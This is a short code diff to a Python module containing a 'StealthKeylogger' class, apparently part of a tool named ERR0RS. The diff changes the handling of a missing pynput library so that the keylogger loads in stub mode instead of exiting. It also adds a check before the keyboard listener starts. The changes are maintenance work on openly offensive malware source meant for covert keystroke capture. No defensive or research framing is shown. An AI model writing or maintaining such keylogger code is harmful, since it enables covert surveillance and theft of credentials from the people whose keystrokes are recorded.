@@ -55,8 +55,8 @@ try:
     PYNPUT_AVAILABLE = True
 except ImportError:
     PYNPUT_AVAILABLE = False
-    print("[!] pynput not available — install with: pip install pynput")
-    sys.exit(1)
+    print("[!] pynput not available — keylogger module in stub mode (pip install pynput to enable)")
+    # Do NOT sys.exit() — allow module to import so the rest of ERR0RS boots cleanly
 
 try:
     from cryptography.fernet import Fernet
@@ -315,6 +315,9 @@ class StealthKeylogger:
         self.active_modifiers.discard(key)
 
     def start(self):
+        if not PYNPUT_AVAILABLE:
+            print("[!] pynput not installed — cannot start keylogger. Run: pip install pynput --break-system-packages")
+            return
         self.running = True
         try:
             with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
